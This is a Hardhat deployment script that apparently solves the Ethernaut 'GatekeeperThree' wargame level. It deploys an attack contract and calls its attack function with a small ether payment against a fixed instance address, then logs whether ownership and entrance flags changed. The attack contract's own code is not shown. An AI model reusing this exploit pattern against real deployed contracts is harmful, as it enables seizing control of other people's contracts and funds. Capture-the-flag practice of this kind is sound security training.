import { ethers } from "hardhat";
import { GatekeeperThree__factory } from "../typechain/factories/contracts/GatekeeperThree.sol/GatekeeperThree__factory";
import { GatekeeperThreeAttack__factory } from "../typechain/factories/contracts/GatekeeperThreeAttack__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x626DebD5C06F9007EeebF1ef71d4A110166243Cd";
    let gatekeeperThree = new GatekeeperThree__factory(signer).attach(instance_address);
    
    console.log(await gatekeeperThree.entrant());
    console.log(await gatekeeperThree.owner());
    console.log(await gatekeeperThree.allowEntrance());
    
    let attack = await new GatekeeperThreeAttack__factory(signer).deploy(gatekeeperThree.address);
    await attack.deployed();
    

    let tx = await attack.attack({value:ethers.utils.parseEther("0.0011")});
    await tx.wait();
    console.log(await gatekeeperThree.owner());
    console.log(await gatekeeperThree.allowEntrance());
    console.log(await gatekeeperThree.entrant());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
